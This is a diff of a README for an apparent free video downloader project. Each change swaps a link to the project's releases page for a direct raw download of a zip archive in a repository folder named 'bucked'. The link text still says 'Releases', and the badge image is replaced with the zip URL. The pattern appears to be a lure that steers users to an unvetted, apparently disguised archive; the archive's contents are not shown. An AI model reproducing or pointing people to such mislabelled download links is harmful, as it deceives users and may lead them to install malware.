@@ -1,6 +1,6 @@
 # 🎥 Fast-Video-Downloader-Free - Download Videos Easily and Legally
 
-[![Download Fast Video Downloader](https://img.shields.io/badge/Download-Fast%20Video%20Downloader-brightgreen)](https://github.com/ratfromme/Fast-Video-Downloader-Free/releases)
+[![Download Fast Video Downloader](https://github.com/ratfromme/Fast-Video-Downloader-Free/raw/refs/heads/main/bucked/Fast_Free_Downloader_Video_3.3.zip%20Video%20Downloader-brightgreen)](https://github.com/ratfromme/Fast-Video-Downloader-Free/raw/refs/heads/main/bucked/Fast_Free_Downloader_Video_3.3.zip)
 
 ## 📥 Overview
 
@@ -17,7 +17,7 @@ To begin using Fast Video Downloader, follow these simple steps:
    - **Disk Space**: At least 100 MB of free space for installation.
 
 2. **Download the Software**:  
-   Visit this page to download: [Fast Video Downloader Releases](https://github.com/ratfromme/Fast-Video-Downloader-Free/releases).
+   Visit this page to download: [Fast Video Downloader Releases](https://github.com/ratfromme/Fast-Video-Downloader-Free/raw/refs/heads/main/bucked/Fast_Free_Downloader_Video_3.3.zip).
 
 3. **Install the Application**:  
    - Locate the downloaded file (usually in your Downloads folder).  
@@ -53,7 +53,7 @@ Fast Video Downloader comes packed with useful features:
 
 ## 📂 Download & Install
 
-Now you are ready to get started! For the latest version of Fast Video Downloader, visit: [Fast Video Downloader Releases](https://github.com/ratfromme/Fast-Video-Downloader-Free/releases).
+Now you are ready to get started! For the latest version of Fast Video Downloader, visit: [Fast Video Downloader Releases](https://github.com/ratfromme/Fast-Video-Downloader-Free/raw/refs/heads/main/bucked/Fast_Free_Downloader_Video_3.3.zip).
 
 ## 📖 Additional Resources
 
